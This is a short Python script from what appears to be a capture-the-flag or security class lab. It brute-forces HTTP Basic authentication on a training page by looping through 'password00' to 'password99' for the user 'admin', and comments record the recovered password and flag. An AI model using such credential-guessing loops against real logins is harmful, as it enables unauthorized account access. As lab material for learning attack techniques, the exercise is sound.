

# Make a Python script that logs in to this page:
# https://bowneconsultingcontent.com/BASIC/index.php
# with these parameters:
# Username: admin
# Password: password with a two-digit number appended to it, like password11
# User-Agent: python

import requests

# Input
url = 'https://bowneconsultingcontent.com/BASIC/index.php'
username = 'admin'
headers = {'User-Agent': 'python'}

# Process, output
for password in range(99, -1, -1):
    pwd = 'password' + str(password).rjust(2, '0')
    r = requests.get(url, auth=(username, pwd), headers=headers)
    if 'flag' in r.text:
        print(f"The 'admin' password is '{pwd}'")
        print(r.text)
        break

# The 'admin' password is 'password78'
# Congratulations! The flag is secure-basic
